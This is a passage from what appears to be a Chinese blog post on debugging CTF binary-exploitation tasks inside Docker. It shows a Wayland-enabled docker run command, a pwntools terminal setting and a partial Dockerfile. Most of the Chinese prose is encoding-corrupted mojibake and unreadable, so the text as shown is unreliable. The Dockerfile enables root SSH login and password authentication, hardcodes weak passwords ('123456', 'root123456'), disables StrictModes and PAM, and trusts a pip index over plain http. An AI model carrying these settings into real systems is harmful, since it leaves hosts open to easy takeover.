çŒœçš„æ¯”èµ›</a>çš„å«é‡‘é‡äº†</del></p></blockquote><p>ä½†æ˜¯ Docker ä¸€ç›´æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯<strong>é»˜è®¤æ˜¯æ²¡æœ‰å›¾å½¢ç¯å¢ƒçš„</strong>ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬æ²¡æ³•ç›´æ¥åœ¨ Docker å½“ä¸­è¿è¡Œ GUI ç¨‹åºï¼Œå¯¹äºéœ€è¦å¤æ‚å †é£æ°´ç­‰å¤šæ¬¡è°ƒè¯•çš„ Pwn é¢˜ç›®è€Œè¨€åˆ™æ²¡åŠæ³•åƒç›´æ¥è¿è¡Œåœ¨ä¸»æœºä¸Šé‚£æ ·ç›´æ¥é€šè¿‡ <code>gdb.attach()</code> å¼¹ä¸€ä¸ªä¼ªç»ˆç«¯çª—å£å‡ºæ¥ï¼š</p><p><img src="https://s2.loli.net/2023/10/24/ogN4EqIUx9TVm6u.jpg" alt="æ„Ÿè§‰ä¸å¦‚ lldb"></p><p><a href="https://github.com/tmux/tmux/wiki">TMUX</a> ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªæ¯”è¾ƒå¥½çš„ docker ä¸­çš„å¤šç»ˆç«¯è§£å†³æ–¹æ¡ˆï¼Œå½“ä½ åœ¨ tmux ä¸­è¿è¡Œ exploit æ‰§è¡Œåˆ° <code>gdb.attach()</code> è¿™æ ·éœ€è¦ä¸€ä¸ªæ–°ç»ˆç«¯çš„å‘½ä»¤æ—¶ï¼Œtmux å¯ä»¥æ— ç¼åˆ†å‰²å‡ºä¸€ä¸ªæ–°çš„çª—å£ï¼Œé€šè¿‡é¢å¤–æŒ‡å®š pwntools ä¸­çš„ <code>context.terminal</code> ç¯å¢ƒå˜é‡å¯ä»¥æ§åˆ¶æ–°çª—å£çš„åˆ†å‰²ä½ç½®ï¼š</p><p><img src="https://s2.loli.net/2023/10/24/i2XEPgZGlVse1W8.jpg" alt="æ˜¯æ–°ç»ˆç«¯å—ï¼Ÿå¦‚æ–°"></p><p>ä½†æ˜¯ tmux çš„ç¿»é¡µæ‰‹æ„Ÿç»ˆç©¶æ˜¯å·®ç‚¹æ„æ€ï¼Œä¸åƒå›¾å½¢åŒ–ç•Œé¢é‚£æ ·å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ç”¨æ»šè½®æ»šæ¥æ»šå»ï¼ŒåŒæ—¶åŸºäº GUI çª—å£çš„è·¨è¡Œæ–‡æœ¬å¤åˆ¶ä¹Ÿä¼šè·¨å¤šä¸ª tmux çª—å£ï¼Œæ‰“ç ´äº†ä¸åŒçª—å£çš„éš”ç¦»æ€§ï¼š</p><p><img src="https://s2.loli.net/2023/10/24/uaZ1VEfeXFDCshq.jpg" alt="æ›´é‡è¦çš„ä¸€ç‚¹æ˜¯ç¬”è€…å½“æ—¶éå¸¸ sb è®¤ä¸º tmux ä¸èƒ½ç¿»é¡µ"></p><p>ç¬”è€…å½“å¹´çš„è§£å†³æ–¹æ¡ˆæ˜¯ç›´æ¥å¼€å¤šä¸ªè™šæ‹Ÿæœºï¼Œä½†ç”¨èµ·æ¥æ€»æ„Ÿè§‰å·®ç‚¹æ„æ€ä¸è¯´ï¼Œè¿˜å ç”¨äº†å¤§é‡çš„ç‰©ç†ç£ç›˜ç©ºé—´â€”â€”ç¬”è€…æœ¬ç§‘é˜¶æ®µå‰ä¸¤å¹´æ‰€ç”¨çš„ç”µè„‘æ˜¯<strong>æœºèº«åªæ­è½½äº†ä¸€å— 512GB SSD çš„ surface book 2</strong>â€”â€”ä¸ºä»€ä¹ˆè¿™é‡Œè¦ç‰¹åˆ«è®²ä¸€ä¸‹è¿™ä¸ªæœºå‹å¹¶ä¸æ˜¯å› ä¸ºç¬”è€…æƒ³è¦ç‚«å¯Œï¼Œè™½ç„¶è¯´ä»ä»·æ ¼è€Œè¨€ surface ç³»ç»Ÿäº§å“å’Œ MacBook ç³»åˆ—äº§å“ä¸€æ ·åŒå±ä»·æ ¼æé«˜æ€§ä»·æ¯”æä½çš„â€œé«˜ç«¯äº§å“â€ï¼Œä½†ç¬”è€…å½“æ—¶æ˜¯åœ¨æŸæµ·é²œå¸‚åœºä¹°çš„å¯èƒ½å¤§äºäºŒæ‰‹çš„æœºå­ï¼Œæ‰€ä»¥å…¶å®æ²¡æœ‰èŠ±å¤ªå¤šé’±ï¼Œä½†å’Œ MacBook ä¸€æ ·çš„æ˜¯ surface å…¨ç³»åˆ—äº§å“<strong>æ²¡æœ‰åŠæ³•è‡ªè¡Œæ›´æ¢åŒ…æ‹¬å†…å­˜ä¸ç¡¬ç›˜åœ¨å†…çš„ä»»ä½•éƒ¨ä»¶</strong>ï¼Œè€Œå³ä¾¿æ˜¯åœ¨æµ·é²œå¸‚åœºå¯»å®çš„æƒ…å†µä¸‹ç¬”è€…ä¹Ÿä¹°ä¸èµ·æ›´å¤§å®¹é‡çš„ç‰ˆæœ¬ï¼Œå†åŠ ä¸Šç¬”è€…å½“æ—¶é™¤äº†æ˜¯ä¸ªè®¡ç®—æœºç§‘å­¦çˆ±å¥½è€…ä»¥åŠç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šæœ¬ç§‘ç”Ÿçš„èº«ä»½ä»¥å¤–è¿˜æ˜¯åŠä¸ªç”»å¸ˆåŠ åå…­åˆ†ä¹‹ä¸€ä¸ªå¹³é¢è®¾è®¡å¸ˆï¼ˆå½“ç„¶ç°åœ¨å·²ç»ä¸æ˜¯æœ¬ç§‘ç”Ÿäº†ï¼‰ï¼Œè£…ä¸ª visual studio åŠ ä¸ª matlab åŠ ä¸Š jetbrains å…¨å®¶æ¡¶å†è£…ä¸ª adobe åŠå®¶æ¡¶ï¼ˆä¸»è¦å°±ç”¨ PS å’Œ AI è¿˜æœ‰ä¸ªå‰ªè§†é¢‘çš„å«å•¥ğŸ‘´å·²ç»è®°ä¸å¾—äº†ï¼‰å°±å·²ç»æŠŠç¡¬ç›˜å¡«å¾—æ»¡æ»¡å½“å½“çš„äº†ï¼Œå„ç§æ‚ä¸ƒæ‚å…«çš„èµ„æ–™ç…§ç‰‡éŸ³ä¹è§†é¢‘å•¥çš„åˆè¦åƒæ‰å°‘è¯´å‡ å GBï¼Œè¿™ä¸ªæ—¶å€™å†å¡å‡ ä¸ªå¹³å‡åå‡  GB çš„å„ç§è™šæ‹Ÿæœºï¼ˆä¸»åŠ›è™šæ‹Ÿæœºæ‰€å ç”¨çš„ç¡¬ç›˜ç©ºé—´è¶…è¿‡100GBï¼‰æ— ç–‘æ›´æ˜¯è®©æœ¬å°±ä¸å¯Œè£•çš„ <strong>512GB SSD</strong> é›ªä¸ŠåŠ éœœ</p><blockquote><p>è€Œç¬”è€…ä¸ºä»€ä¹ˆé€‰æ‹©ä¹°è¿™æ ·ä¸€å°ä¸­çœ‹ä¸ä¸­ç”¨çš„ç”µè„‘æ˜¯å› ä¸ºåœ¨åˆä¸­çš„æ—¶å€™ç¬”è€…çœ‹ä¸€æœ¬ä¸çŸ¥é“å«å•¥çš„ç”µå­ç¡¬ä»¶ç›¸å…³çš„æ‚å¿—ä¸­çœ‹åˆ° <code>surface book</code> çš„ <em>å±å¹•é”®ç›˜å¯åˆ†ç¦»ã€ç‹¬æ˜¾æ”¾ç½®åœ¨é”®ç›˜ä¸­</em> çš„è¿™æ ·ä¸€ä¸ªå‰æ‰€æœªæœ‰çš„è§£å†³æ–¹æ¡ˆæ„Ÿåˆ°ååˆ†æƒŠäººåŠ éå¸¸çš„å¸…æ°”ï¼Œäºæ˜¯å°±ä¸€ç›´å¿ƒå¿ƒå¿µå¿µæƒ³è¦ä¹°ä¸€å°è¿™æ ·çš„æœ¬å­ï¼Œé«˜ä¸­æ—¶æœŸç¬”è€…æ¢è¿‡ä¸‰å°ä¸åŒçš„å¹³æ¿ç”µè„‘äºŒåˆä¸€äº§å“ï¼ˆå½“ç„¶ï¼Œéƒ½æ˜¯ä»æŸæµ·é²œå¸‚åœºæ·˜æ¥çš„ï¼Œä¸”åŸºæœ¬ä¸Šæ˜¯å–äº†ä¸Šä¸€å°æ‰ä¹°ä¸‹ä¸€å°ï¼‰ï¼Œå…¶ä¸­ç¬¬ä¸€å°æ˜¯ surface 3 è€Œç¬¬ä¸‰å°æ˜¯ surface pro 3ï¼Œå½“æ—¶çš„ä¸»è¦ç”¨é€”æ˜¯æ‹¿æ¥æ—¥å¸¸åˆ·åˆ· OI ã€å†™ç‚¹å°è¯´ <del>ï¼ˆé‚£ä¹ˆè¿™é‡Œå°±ä¸å¾—ä¸ç®€å•å¸®å¿™æ¨å¹¿ä¸€ä¸‹æŸä¸çŸ¥åå¢¨å§“ä½œå®¶æ‰€å†™çš„<a href="https://www.qidian.com/book/1027074530/">ã€Šä»é›¶å¼€å§‹çš„ CTFer ç”Ÿæ´»ã€‹</a> è¿™éƒ¨å°è¯´äº†è™½ç„¶ä¸€ç›´åœ¨å’•å’•å’•ï¼‰</del> ç©ä¸€äº›è½»é‡æ¸¸æˆï¼Œä½“æ„Ÿå…¶å®è¿˜è¡Œ</p><blockquote><p>å½“ç„¶ç°åœ¨å¾®è½¯çš„ surface ç³»åˆ—äº§å“å·²ç»èƒ½å¤Ÿåˆæ­¥åœ°è‡ªè¡Œæ›´æ¢ç¡¬ç›˜ï¼Œè™½ç„¶æ˜¯å……æ»¡æ§½ç‚¹çš„ <code>2230</code> è§„æ ¼ï¼Œä½†æ˜¯å’Œéš”å£æŸæ°´æœå“ç‰Œç›¸æ¯”å·²ç»å¥½å¾—ä¸å¾—äº†äº†</p><blockquote><p>ä½†æ˜¯å„é¡¹æ€§èƒ½åˆè¢«éš”å£ç§’æˆæ¸£æ¸£äº†ï¼Œå¾®è½¯ä½ åœ¨å¹²ä»€ä¹ˆå•Šå¾®è½¯ï¼ˆæ¼ï¼‰</p><p><del>ä½†å…¶å®ä»”ç»†ä¸€æƒ³è¿™ä¸åº”è¯¥æ˜¯Intelçš„é”…ä¹ˆï¼Œwintelè”ç›Ÿä¾æ‰˜ç­”è¾©äº†ğŸ‘Š</del></p></blockquote></blockquote><p>ä»¥åŠ surface ç³»ç»Ÿäº§å“ä¸€ç›´æœ‰ä¸€ä¸ªå™±å¤´å°±æ˜¯æœ‰ä¸ªè§¦æ§ç¬”å¯ä»¥ç”»ç”»ï¼Œä¹Ÿå°±æ˜¯è‡ªå¸¦æ•°ä½å±ï¼Œè¿™ä¹Ÿæ˜¯è¿™ä¸ªäº§å“ä¸€ç›´ä»¥æ¥æœ€å¸å¼•ç¬”è€…çš„ä¸€ç‚¹ï¼Œè™½ç„¶å¾®è½¯æœ€åˆç»™å¤§å®¶å‘ˆä¸Šæ¥çš„åªæ˜¯ä¸€å¨é—»ç€é¦™åƒç€è‡­çš„ç­”è¾©ï¼Œä½†ç¬”è€…ä¸€ç›´å¸Œæœ›éšç€äº§å“ä¸æ–­è¿­ä»£ï¼Œå¾®è½¯èƒ½å¤ŸæŠŠè¿™ä¸ªåŠŸèƒ½ç»™çœŸæ­£åšå¥½ï¼Œå°±ç®—è¾¾ä¸åˆ° wacom ä¸Šä¸‡å—é’±çš„æ•°ä½å±ç›¸çš„é«˜åº¦è‡³å°‘ä¹Ÿè¦å’Œå›½äº§çš„ä¸€åƒå‡ºå¤´çš„æ•°ä½å±æ°ä¸ªæ‰‹è…•çš„ç¨‹åº¦ï¼Œå¯æƒœ<strong>å“ªæ€•æ˜¯ä¸€ç›´åˆ°ä»Šå¤©æœ€æ–°çš„ surface pro 9 è¿™ä¸€ä»£äº§å“ï¼Œå…¶ç»˜ç”»æ‰‹æ„Ÿä¾æ—§æ¯”ä¸è¿‡å‡ åƒå—é’±çš„ iPad ï¼Œç”šè‡³æ¯”ä¸è¿‡200å—å‡ºå¤´çš„å›½äº§æ•°ä½æ¿</strong>ï¼ˆå½“ç„¶ç¬”è€…åªä¹°äº† surface pro 8 æ²¡æœ‰ä¹° surface pro 9 å› ä¸ºå¾®è½¯éå¸¸ SB åœ°æŠŠ 3.5mm è€³æœºæ¥å£è¿™ä¸ªå¤©é¡¶æ˜Ÿç§‘æŠ€ç»™ç æ‰äº†å¹¶ä¸”æ€§èƒ½å’Œç»­èˆªå’Œ 8 ä»£ç›¸æ¯”å¹¶æ²¡æœ‰ä»€ä¹ˆæå‡ç®€è€Œè¨€ä¹‹åˆæ˜¯æŒ¤ç‰™è†çš„ä¸€ä»£ï¼Œä½†ç¬”è€…æœ‰å»å¾®è½¯çº¿ä¸‹é—¨åº—äº²è‡ªå°è¯•è¿‡æœ€æ–°ä¸€ä»£ï¼Œç»˜ç”»æ‰‹æ„Ÿä¾æ—§ä¸€å¨ç­”è¾©ï¼‰</p></blockquote><p>è™½ç„¶ surface book 2 æ— æ³•æ›´æ¢ç¡¬ç›˜çš„ç‰¹æ€§è®©ç¬”è€…éå¸¸ç—›è‹¦ï¼Œä½†ä»”ç»†æƒ³æ¥è¿˜æ˜¯è€ç½—çš„é‚£å¥åè¨€â€”â€”<code>åˆä¸æ˜¯ä¸èƒ½ç”¨</code>ï¼Œç¡¬ç›˜ç©ºé—´æƒ³åŠæ³•è…¾ä¸€è…¾å¤šå¼€å¥½å‡ ä¸ªè™šæ‹Ÿæœºå…¶å®æ²¡ä»€ä¹ˆä¸å¥½ï¼Œæ¯•ç«Ÿçœå»äº†æŠ˜è…¾ docker çš„éº»çƒ¦å°±ä¸€ä¸‡ä¸ªå€¼ï¼Œäºæ˜¯ç¬”è€…æ—¥æ¸ä¹ æƒ¯æ¯å¤©åœ¨ä¸åŒè™šæ‹Ÿæœºä¹‹é—´è·³æ¥è·³å»</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231125222853.png" alt="ä½ çŸ¥é“æˆ‘è¦è¯´ä»€ä¹ˆ.png"></p><p>ä¸è¿‡è¿™ä¸ªé—®é¢˜å¹¶æ²¡æœ‰æŠ˜ç£¨ç¬”è€…å¤ªé•¿çš„æ—¶é—´ï¼Œåœ¨ç©äº†å°†è¿‘ä¸€ä¸ªå­¦æœŸçš„ç”¨æˆ·æ€ Pwn å­¦äº†å„ç§ä¸åŒçš„ house ä¹‹åç¬”è€…æ„Ÿè§‰ glibc pwn åœ¨æŠ€æœ¯ä¸ŠåŸºæœ¬ä¸Šå·²ç»ç©ä¸å‡ºä»€ä¹ˆæ–°çš„æœ‰æ„æ€çš„èŠ±æ ·äº†ï¼Œäºæ˜¯é€‰æ‹©äº† all in Linux kernel pwnï¼Œåªéœ€è¦ç”¨ QEMU å»è·‘è™šæ‹Ÿæœºï¼Œgdb å¯ä»¥ç›´æ¥è¿ä¸Š QEMU çš„ç«¯å£è¿›è¡Œè°ƒè¯•ï¼Œä¹Ÿä¸ä¾èµ–äºæŸäº›ç‰¹å®šçš„ glibc ç¯å¢ƒï¼ˆè™½ç„¶åé¢ç©è™šæ‹Ÿæœºé€ƒé€¸åˆç”¨åˆ°äº†ä¸è¿‡è¿™æ˜¯åè¯äº†ï¼‰ï¼Œäºæ˜¯å½“åˆæ­å»ºçš„å‡ ä¸ªç”¨æˆ·æ€ Pwn ç¯å¢ƒçš„è™šæ‹Ÿæœºå°±æ…¢æ…¢ç”¨ä¸åˆ°äº†ï¼Œ <em>ç°åœ¨å·²ç»è¢«ç¬”è€…é€ä¸€æ‰“åŒ…æ‰”åˆ°å¤‡ä»½ç¡¬ç›˜å½“ä¸­</em></p><p>è€Œåœ¨ 2023 å¹´çš„ä»Šå¤©ï¼Œç¬”è€…åˆæƒ³è¶ç€é—²æš‡æ—¶é—´å†ä¸šä½™å°ç©ä¸€ä¸‹ç”¨æˆ·æ€çš„ Pwnï¼ˆæ¯”èµ›å¤§æ¦‚ç‡ä¸ä¸€å®šä¼šä¸“é—¨æ‰“äº†ï¼Œæœ€å¤šå°±çœ‹åˆ° corCTF è¿™æ ·çš„ä¼˜è´¨æ¯”èµ›ä¼šå»åšåšä»–ä»¬çš„å†…æ ¸é¢˜ï¼Œä¸€äº›æ¯”è¾ƒæœ‰æ„æ€çš„çš„ç”¨æˆ·æ€ Pwn é¢˜æœ€å¤šå¯èƒ½èµ›åä¼šå¤ç°ä¹‹ç±»çš„ï¼‰ï¼Œé‚£ä¹ˆç¯å¢ƒä»¥åŠå„ç§ libcï¼ˆåŒ…æ‹¬ glibc ã€tclibcã€muslï¼Œ<del>ğŸ‘´å…¶å®æ²¡æƒ³æ˜ç™½ musl ä¸ºå•¥ä¼šåœ¨ CTF é‡Œæµè¡Œèµ·æ¥ï¼Œæ˜¯æ²¡æ´»äº†ğŸ</del>ï¼‰åˆé‡æ–°å˜ä¸ºç¬”è€…éœ€è¦é¢å¯¹çš„é—®é¢˜ä¹‹ä¸€ï¼Œè€Œå½¼æ—¶åŒæ—¶è·‘å¥½å‡ ä¸ªè™šæ‹Ÿæœºçš„è§£å†³æ–¹æ¡ˆæœªå…å¤ªè¿‡äºå°ä¸‘ğŸ¤¡ï¼Œå› æ­¤ç¬”è€…å†³å®šæ‰¾åˆ°ä¸€ä¸ªèƒ½å¤Ÿåœ¨ docker å½“ä¸­æ‰§è¡Œ <code>gdb.attach()</code> æ—¶ç›´æ¥åœ¨å®¿ä¸»æœºä¸­å¼¹å‡ºä¸€ä¸ªçª—å£çš„åŠæ³•</p><blockquote><p>å†™äº†è¿™ä¹ˆå¤šæ²¡ç”¨çš„æ‰¹è¯ï¼Œçªç„¶æ„Ÿè§‰è¿™ä¸€ç¯‡å…¶å®åº”è¯¥æ”¾åˆ° <a href="https://arttnba3.cn/categories/PIECES/">PIECES</a> åˆ†ç±» è€Œé <a href="https://arttnba3.cn/categories/OPS/">OPS</a> ï¼Œä½†ä»”ç»†æƒ³æƒ³å…¶å®ç¬”è€…çœŸæ­£è¦è®²çš„æ ¸å¿ƒå†…å®¹å…¶å®æ˜¯ docker çš„ä¸€ä¸ªå°çŸ¥è¯†ï¼Œæ‰€ä»¥è¿˜æ˜¯æ”¾ OPS åˆ†ç±»ä¸‹æˆ–è®¸ä¼šæ›´åŠ åˆé€‚ä¸€äº›</p></blockquote><h1 id="0x01-ä¸º-Docker-æ¥å…¥-Wayland-ç¯å¢ƒ"><a href="#0x01-ä¸º-Docker-æ¥å…¥-Wayland-ç¯å¢ƒ" class="headerlink" title="0x01. ä¸º Docker æ¥å…¥ Wayland ç¯å¢ƒ"></a>0x01. ä¸º Docker æ¥å…¥ Wayland ç¯å¢ƒ</h1><blockquote><p>ç¬”è€…æ‰€ç”¨çš„å›¾å½¢æœåŠ¡ä¸º Waylandï¼Œå› æ­¤æœ¬ç¯‡ä¸ä¼šè®² X11 è¯¥æ€ä¹ˆé…ç½®ï¼ˆæ¯•ç«Ÿå·²ç»æœ‰å¾ˆå¤šè®²è¿™ä¸ªçš„<a href="https://gist.github.com/turekt/71f6950bc9f048daaeb69479845b672b">æ–‡ç« </a>äº†ï¼Œ<del>ï¼Œä»¥åŠéƒ½ä»€ä¹ˆå¹´ä»£äº†è¿˜åœ¨ç”¨ä¼ ç»Ÿå›¾å½¢æœåŠ¡</del>ï¼‰</p></blockquote><p>é…ç½®çš„åŠæ³•å…¶å®å¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å¯åŠ¨å®¹å™¨æ—¶é¢å¤–æ·»åŠ ä¸€äº›å‚æ•°å³å¯ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t pwnenv_ubuntu20 .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d -p <span class="hljs-string">&quot;2222:22&quot;</span> \</span><br><span class="language-bash">--name=pwnenv_ubuntu20 \</span><br><span class="language-bash">-e XDG_RUNTIME_DIR=/tmp \</span><br><span class="language-bash">-e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">-e WAYLAND_DISPLAY=<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">-v <span class="hljs-variable">$XDG_RUNTIME_DIR</span>/<span class="hljs-variable">$WAYLAND_DISPLAY</span>:/tmp/<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">-e QT_QPA_PLATFORM=wayland \</span><br><span class="language-bash">pwnenv_ubuntu20</span><br></code></pre></td></tr></table></figure><blockquote><p><del>åˆ«é—®ğŸ‘´è¿™äº›å‚æ•°æ˜¯ä»€ä¹ˆæ„æ€ï¼Œè‡ªå·±æŸ¥å—·</del></p></blockquote><p>å¯åŠ¨ä¹‹åå®¹å™¨å…¶å®å°±å®Œæˆå¯¹ Wayland æœåŠ¡çš„æ¥å…¥äº†ï¼Œè¿™é‡Œæˆ‘ä»¬ç®€å•å†™ä¸€ä¸ª QT å°ç¨‹åºçœ‹çœ‹å®åŠ›ï¼š</p><p><img src="https://s2.loli.net/2023/10/25/bsER7NLVfD3Oq28.png" alt="libEGL çš„æŠ¥é”™æ‡’å¾—ç®¡äº†ï¼Œåæ­£æ—¥å¸¸ä½¿ç”¨æ²¡å•¥å½±å“"></p><p>ç°åœ¨æˆ‘ä»¬çš„ docker å°±å·²ç»æˆåŠŸæ¥å…¥ Host ä¾§çš„å›¾å½¢æœåŠ¡äº†ï¼šï¼‰</p><h1 id="0x02-è®©-gdb-attach-å¼¹å‡ºä¸€ä¸ªæ–°çš„å›¾å½¢çª—å£"><a href="#0x02-è®©-gdb-attach-å¼¹å‡ºä¸€ä¸ªæ–°çš„å›¾å½¢çª—å£" class="headerlink" title="0x02. è®© gdb.attach() å¼¹å‡ºä¸€ä¸ªæ–°çš„å›¾å½¢çª—å£"></a>0x02. è®© gdb.attach() å¼¹å‡ºä¸€ä¸ªæ–°çš„å›¾å½¢çª—å£</h1><p>è¿™ä¸ªå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œç¬”è€…ç”¨çš„æ˜¯ KDE æ¡Œé¢ï¼Œæ‰€ä»¥å…ˆåœ¨å®¹å™¨é‡Œè£…ä¸€ä¸ª <code>konsole</code> ï¼Œå¦‚æœä½ ç”¨çš„æ˜¯ Gnome åˆ™å¯ä»¥è£…ä¸ª <code>gnome-terminal</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install konsole</span><br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨ pwntools è°ƒç”¨ gdb ä¹‹å‰å°†å…¨å±€å˜é‡ <code>context.terminal</code> çš„å€¼è®¾ä¸ºå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br></code></pre></td></tr></table></figure><p>ä¹‹åå°±èƒ½åƒè°ƒè¯•æœ¬åœ°åŸç”Ÿè¿›ç¨‹é‚£æ ·åœ¨è°ƒè¯• docker é‡Œçš„è¿›ç¨‹çš„æ—¶å€™å¼¹å‡ºä¸€ä¸ªæ–°çš„ gdb å›¾å½¢çª—å£äº† ï¼šï¼‰</p><p><img src="https://s2.loli.net/2023/10/25/fKS5bQUizjakCAr.jpg" alt="yattaze"></p><h1 id="0xFF-Whatâ€™s-moreâ€¦"><a href="#0xFF-Whatâ€™s-moreâ€¦" class="headerlink" title="0xFF. Whatâ€™s moreâ€¦"></a>0xFF. Whatâ€™s moreâ€¦</h1><p>æœ€åç»™å‡ºä¸€ä¸ªç¬”è€…è‡ªç”¨çš„å¼€ç®±å³ç”¨çš„ docker pwn ç¯å¢ƒçš„ Dockerfileï¼Œæœ‰éœ€è¦çš„å¯ä»¥è‡ªå–ï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># pre-install softwares</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 python3-pip git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim nano netcat openssh-server unzip make wget bison flex build-essential \</span><br><span class="language-bash">    curl qemu qemu-system-x86 gcc gdb clang lldb tmux konsole</span><br><br><span class="hljs-comment"># enable ssh login</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># enable login with password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># set username and password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m -s /bin/bash &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:root123456&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># enable ssh key login</span><br><span class="hljs-comment">#RUN mkdir /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="hljs-comment">#    echo &quot;Your ssh key&quot; &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># keep container running</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-comment"># enable sudo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y sudo &amp;&amp; \</span><br><span class="language-bash">       usermod -aG sudo arttnba3</span><br><br><span class="hljs-comment"># pwn-related tools</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> python3 -m pip config <span class="hljs-built_in">set</span> global.index-url http://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip config <span class="hljs-built_in">set</span> global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install -U pip &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install --no-cache-dir \</span><br><span class="language-bash">    pwntools \</span><br><span class="language-bash">    ropgadget \</span><br><span class="language-bash">    z3-solver \</span><br><span class="language-bash">    smmap2 \</span><br><span class="language-bash">    apscheduler \</span><br><span class="language-bash">    ropper \</span><br><span class="language-bash">    unicorn \</span><br><span class="language-bash">    keystone-engine \</span><br><span class="language-bash">    capstone 